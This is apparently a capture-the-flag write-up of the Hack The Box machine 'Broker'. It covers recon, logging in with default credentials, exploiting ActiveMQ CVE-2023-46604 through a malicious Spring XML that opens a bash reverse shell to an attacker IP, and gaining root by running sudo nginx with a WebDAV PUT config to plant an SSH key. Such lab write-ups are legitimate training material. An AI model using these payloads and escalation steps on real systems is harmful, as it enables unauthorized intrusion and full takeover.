---
layout: post
title: HTB - Broker
date: 2023-11-09 12:48 +0200
categories: [HTB Machines]
tags: [ActiveMQ,CVE-2023-46604,Sudoers,Basic-Auth,Deserialization,Nginx]  
image: /assets/img/hackthebox/machines writeups/Broker/Cover.png
---


## Summary

Broker starts with a website that hosting a version of `Apache ActiveMQ`. Enumerating the version of `Apache ActiveMQ` shows that it is vulnerable to `Unauthenticated RCE`, which is leveraged to gain user access on the target. Post-exploitation enumeration reveals that the system has a `sudo` misconfiguration allowing the `activemq` user to execute `sudo /usr/sbin/nginx`.

## Machine Info

|                      |                                                                                                  |
|:--------------------:|:------------------------------------------------------------------------------------------------:|
| **Box Name**         |  Broker                                                                                        |
| **OS**               |  ![](/assets/img/hackthebox/machines writeups/Broker/linux_penguin.png){: w="35" h="30" }      |
| **Difficulty**       |  Easy                                                                                            |
| **Graph**            |  ![](/assets/img/hackthebox/machines writeups/Broker/graph.png)                                |
| **Points**           |  20                                                                                              |
| **Release Date**     |  09 Nov 2023                                                                                     |
| **Retire Date**      |  09 Nov 2023                                                                                     |




## Recon

### Nmap

Using `Nmap` to enumerate all open ports and services by doing this on two phases to speed things up :

- **Phase 1 :** Make a simple scan to check for all opened `TCP` ports with high rate of checking port equel to 10000.
- **Phase 2 :** After idetify the open ports start the sec phase to fingerprint (services, versions, etc) for each open port.


```bash
# Fast scan to check open ports
nmap -p- --min-rate 10000 10.10.11.243
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-09 18:38 EST
Nmap scan report for 10.10.11.243
Host is up (0.074s latency).
Not shown: 65523 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
1883/tcp  open     mqtt
5672/tcp  open     amqp
8161/tcp  open     patrol-snmp
28335/tcp filtered unknown
43716/tcp filtered unknown
46319/tcp open     unknown
47960/tcp filtered unknown
61613/tcp open     unknown
61614/tcp open     unknown
61616/tcp open     unknown

Nmap done: 1 IP address (1 host up) scanned in 8.05 seconds


# Detailed Scan for spesfic open ports                                                                 
nmap -p 22,80,1883,5672,8161,28335,43716,46319,47960,61613,61614,61616 -sC -A 10.10.11.243
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-09 18:41 EST
Nmap scan report for 10.10.11.243
Host is up (0.14s latency).

PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp    open   http       nginx 1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-server-header: nginx/1.18.0 (Ubuntu)
1883/tcp  open   mqtt
|_mqtt-subscribe: Failed to receive control packet from server.
5672/tcp  open   amqp?
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
8161/tcp  open   http       Jetty 9.4.39.v20210325
|_http-server-header: Jetty(9.4.39.v20210325)
|_http-title: Error 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
28335/tcp closed unknown
43716/tcp closed unknown
46319/tcp open   tcpwrapped
47960/tcp closed unknown
61613/tcp open   stomp      Apache ActiveMQ
| fingerprint-strings: 
|   HELP4STOMP: 
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open   http       Jetty 9.4.39.v20210325
|_http-title: Site does not have a title.
|_http-server-header: Jetty(9.4.39.v20210325)
| http-methods: 
|_  Potentially risky methods: TRACE
61616/tcp open   apachemq   ActiveMQ OpenWire transport
| fingerprint-strings: 
|   NULL: 
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     ProviderName 
|     ActiveMQ
|     StackTraceEnabled
|     PlatformDetails 
|     Java
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|     MaxInactivityDurationInitalDelay
|     ProviderVersion 
|_    5.15.15

```
{: .nolineno }

`nmap` finds the following TCP ports:
- **SSH** - 22 
- **HTTP** - 80
- **ActiveMQ** - ( 61613 & 61616 )
- **mqtt** - 1883 
- **amqp** - 5672 
- **Java webserver Jetty** - ( 8161 & 61614 )
- **unknown** - 39751 



### HTTP Broker.htb - TCP 80

The home page of the website is require a basic auth.

![Home Page](/assets/img/hackthebox/machines writeups/Broker/basic-auth.png)

By trying some defualt creds like ( admin , admin ) we can log in and found that the version of **ActiveMQ** is **5.15.15** as detected before using nmap scan. 

![](/assets/img/hackthebox/machines writeups/Broker/vuln-version.png)


## Shell as activemq

### Public Exploit

Searching for public exploits or CVE for this version and found that this version is vuln to `(CVE-2023–46604)`

![](/assets/img/hackthebox/machines writeups/Broker/public-exploit.png)


The vulnerability is an **Unauthenticated RCE** achived by exploiting a deserialization vulnerability in ActiveMQ then using a gadget from the Spring to load a remote XML file, which has the ability to run programs. For a more detailed look at this blog [post](https://deepkondah.medium.com/unpacking-the-apache-activemq-exploit-cve-2023-46604-92ed1c125b53).

### Exploiting CVE-2023–46604

Using this exploit [POC](https://github.com/evkl1d/CVE-2023-46604) by giving it the target IP and target ActiveMQ port with the hosted url for the malcious XML file.

The content of the XML after edit the ip address to be my attacker machine 

```xml
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg>
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>bash -i &gt;&amp; /dev/tcp/10.10.16.87/9001 0&gt;&amp;1</value>
            </list>
            </constructor-arg>
        </bean>
    </beans>

```

Running the exploit and gaining a shell as activemq

![](/assets/img/hackthebox/machines writeups/Broker/shell.png)

Grab **user.txt**

```console
activemq@broker:/opt/apache-activemq-5.15.15/bin$ cat ~/user.txt
574dca13a7f6********************
```

## Shell as root

### Enumeration

#### Sudoers

Found that the activemq user can run `nginx` as `root` with no password


```console
activemq@broker:/opt/apache-activemq-5.15.15/bin$ sudo -l

Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

### Privelege Esclation

#### Nginx File Write

Creating a malicious nginx config file which will do the following :

- `user root`           : This line to run the nginx as root user
- `worker_connections`  : To define the number of workers
- `listen 8090`         : The port which nginx will listen to
- `root /`              : The root directory to starting with it 
- `dav_methods PUT`     : Allowing nginx to add HTTP and WebDAV methods like PUT according to this [stackoverflow question](https://stackoverflow.com/questions/16912270/how-do-i-allow-a-put-file-request-on-nginx-server#:~:text=To%20add%20HTTP%20and%20WebDAV,configure%20%2D%2Dwith%2Dhttp_dav_module%20).

```config
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 8090;
        root /;
        dav_methods PUT;
    }
}
```

Run it using `sudo nginx` and check if the server is listen on **8090**


```console
activemq@broker:/opt/apache-activemq-5.15.15/bin$ sudo /usr/sbin/nginx -c /opt/apache-activemq-5.15.15/bin/0xRyuzak1.conf
activemq@broker:/opt/apache-activemq-5.15.15/bin$ netstat -ano |grep -i 8090
tcp        0      0 0.0.0.0:8090            0.0.0.0:*               LISTEN      off (0.00/0/0)
```

#### Authorized_keys

Generate pair of public-private keys on your attacker machine to be used to authenticate as root

```console
(kali㉿kali)-[~/HTB/HTB Machines/Broker]─$ ssh-keygen                 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): ./id_rsa  
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ./id_rsa
Your public key has been saved in ./id_rsa.pub
The key fingerprint is:
SHA256:QkDI5/NVMHdf0p+6s1I/5LXjClX4cTby0taWevGynyA kali@kali
The key's randomart image is:
+---[RSA 3072]----+
| . oo   o.. . ...|
|  o ..   o.. ..o.|
|   o  .  .   o.+=|
|    o.  .     *oB|
|     o..S    o.Bo|
|      ..    .o+o+|
|           E.o*.+|
|           .oooO.|
|            .o*++|
+----[SHA256]-----+
```

Using curl with put method to set the content of the `id_rsa.pub` in the `/root/.ssh/authorized_keys` file 


```console
activemq@broker:/opt/apache-activemq-5.15.15/bin$ curl -X PUT localhost:8090/root/.ssh/authorized_keys -d 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNWb6T52Dcv9QlrDTPWOmM/dYTkJmSG8yMFJ/YlTPqJG4xUxt9CEcWA+/oph6e4JEMbpIruuIRgGBURxH1yYu3yP3BudG+TRWb5eu5E9QiLgT3Ue2ekib6wiJU7aKyjQoX9vzV3xvW+xZFVoy0yPXrhdWj+OxvKFdEJ1kUx5PEvGkwtyOontAgcfb33SzgNmYnENihbXlafYRyTPyLQglzbLDy3zGwmFvYdaolYHbuDyUy7zqVXv26B6oTvGeZEPKPnxN9NgnEBkfVNaovHDhlQd28XwxgS640C4/AHabLjlm2ORmYrCO+PHCG66RE7kOWyzDiufo4CbN4FR8bw3XwNxu7P4Cm2947Rp8tKPSJWTVYKZhg98PEIJ6fMolmsjkGPlHNJWXPwlCjz1AOG8jTovVGqq2wHOIEUIGAe3R9A/NARxv3qnVsVOLTlQshOoxM1IqG6L2eiovN5sOGTKWTwQC6nen+VwzkmUpZUToLlZK03dql5NQwsu9nEAu/P1M= kali@kali'
```

SSH as root using `id_rsa` private key 


```console
(kali㉿kali)-[~/HTB/HTB Machines/Broker]─$ ssh -i id_rsa root@broker.htb 
The authenticity of host 'broker.htb (10.10.11.243)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'broker.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

...[snip]...


root@broker:~# whoami
root
root@broker:~# cat root.txt
536f4a448852********************
```
